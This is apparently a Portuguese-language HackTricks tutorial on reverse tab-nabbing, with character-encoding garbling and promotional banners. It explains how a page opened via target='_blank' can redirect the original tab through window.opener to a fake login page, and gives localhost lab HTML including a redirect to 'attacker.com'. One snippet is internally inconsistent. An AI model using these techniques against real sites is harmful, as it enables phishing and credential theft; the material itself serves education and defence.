<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# DescriÃ§Ã£o

Em uma situaÃ§Ã£o em que um **atacante** pode **controlar** o argumento **`href`** de uma tag **`<a`** com o atributo **`target="_blank" rel="opener"`** que serÃ¡ clicada por uma vÃ­tima, o **atacante** **aponta** este **link** para um site sob seu controle (um **site** **malicioso**). EntÃ£o, uma vez que a **vÃ­tima clica** no link e acessa o site do atacante, este **site malicioso** serÃ¡ capaz de **controlar** a **pÃ¡gina original** via o objeto javascript **`window.opener`**.\
Se a pÃ¡gina nÃ£o tiver **`rel="opener"` mas contiver `target="_blank"` e tambÃ©m nÃ£o tiver `rel="noopener"`** ela tambÃ©m pode ser vulnerÃ¡vel.

Uma maneira comum de abusar desse comportamento seria **alterar a localizaÃ§Ã£o do site original** via `window.opener.location = https://attacker.com/victim.html` para um site controlado pelo atacante que **parece com o original**, para que possa **imitar** o **formulÃ¡rio de login** do site original e solicitar credenciais ao usuÃ¡rio.

No entanto, observe que, como o **atacante agora pode controlar o objeto de janela do site original**, ele pode abusar dele de outras maneiras para realizar ataques mais **furtivos** (talvez modificando eventos javascript para exfiltrar informaÃ§Ãµes para um servidor controlado por ele?)

# VisÃ£o geral

## Com link de retorno

Link entre pÃ¡ginas pai e filho quando o atributo de prevenÃ§Ã£o nÃ£o Ã© usado:

![](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Sem link de retorno

Link entre pÃ¡ginas pai e filho quando o atributo de prevenÃ§Ã£o Ã© usado:

![](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Exemplos <a href="#examples" id="examples"></a>

Crie as seguintes pÃ¡ginas em uma pasta e execute um servidor web com `python3 -m http.server`\
Em seguida, **acessar** `http://127.0.0.1:8000/`vulnerable.html, **clique** no link e observe como a **URL do site original muda**.
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}

```html
<a href="https://example.com" target="_blank" rel="noopener noreferrer" onclick="window.opener.location='https://attacker.com'">Click me!</a>
```

{% endcode %}

Este Ã© um exemplo de cÃ³digo HTML malicioso que pode ser usado para realizar um ataque de reverse tab-nabbing. Quando o usuÃ¡rio clica no link, ele abre uma nova aba com o site de destino, mas a aba original Ã© redirecionada para o site do atacante. Isso pode ser usado para roubar informaÃ§Ãµes confidenciais do usuÃ¡rio ou realizar outras atividades maliciosas. Ã‰ importante estar ciente desse tipo de ataque e tomar medidas para se proteger, como evitar clicar em links suspeitos e manter o software de seguranÃ§a atualizado.
```markup
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
  </script>
 </body>
</html>
```
{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
## Propriedades acessÃ­veis <a href="#accessible-properties" id="accessible-properties"></a>

O site malicioso sÃ³ pode acessar as seguintes propriedades do objeto de referÃªncia javascript **opener** (que Ã©, na verdade, uma referÃªncia a uma instÃ¢ncia da classe javascript **window**) em caso de acesso de **origem cruzada** (entre domÃ­nios):

* `opener.closed`: Retorna um valor booleano indicando se uma janela foi fechada ou nÃ£o.
* `opener.frames`: Retorna todos os elementos iframe na janela atual.
* `opener.length`: Retorna o nÃºmero de elementos iframe na janela atual.
* `opener.opener`: Retorna uma referÃªncia Ã  janela que criou a janela.
* `opener.parent`: Retorna a janela pai da janela atual.
* `opener.self`: Retorna a janela atual.
* `opener.top`: Retorna a janela do navegador mais acima.

Se os domÃ­nios forem os mesmos, o site malicioso pode acessar todas as propriedades expostas pelo objeto de referÃªncia javascript [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window).

# PrevenÃ§Ã£o

As informaÃ§Ãµes de prevenÃ§Ã£o estÃ£o documentadas na [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

# ReferÃªncias

{% embed url="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" %}




<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
